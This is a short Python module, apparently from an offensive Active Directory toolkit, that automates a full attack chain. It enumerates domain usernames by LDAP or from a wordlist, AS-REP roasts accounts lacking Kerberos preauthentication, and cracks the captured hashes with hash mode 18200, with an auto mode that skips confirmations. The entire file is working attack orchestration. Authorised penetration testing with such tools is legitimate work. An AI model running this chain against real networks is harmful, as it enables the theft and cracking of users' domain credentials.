def run(args):
    from core.runner import run_module_by_name
    from core.target import load_current_profile, get_all_creds
    from pathlib import Path
    from core.paths import get_artifacts_dir

    data, _ = load_current_profile()
    creds = get_all_creds(data)
    target_name = data["name"]


    artifacts = get_artifacts_dir(data["name"])

    usernames = artifacts / "usernames.txt"
    hashes = artifacts / "asrep_hashes.txt"

    # ---------------- VALIDATION ----------------
    if not creds and not args.extra:
        print("[!] No creds and no input file → cannot proceed")
        return

    def confirm():
        if args.auto:
            return True
        return input("[?] Continue? (Y/n): ").lower() in ["", "y"]

    # ---------------- STEP 1: GET USERS ----------------
    if creds and data.get("domain"):
        print("[*] Using LDAP enumeration")
        run_module_by_name("ad.enum-users", [
            "--out", str(usernames)
        ], data)

    else:
        print("[*] Using wordlist for usernames")
        run_module_by_name("wordlist.gen-usernames", [
            args.extra[0],
            str(usernames)
        ], data)

    if not confirm():
        return

    # ---------------- STEP 2: ASREP ----------------
    run_module_by_name("ad.asreproast", [
        str(usernames),
        str(hashes)
    ], data)

    if not confirm():
        return

    # ---------------- STEP 3: CRACK ----------------
    crack_args = [
        str(hashes),
        "--mode", "18200"
    ]

    if args.auto:
        crack_args.append("--save")

    run_module_by_name("crack.hash", crack_args, data)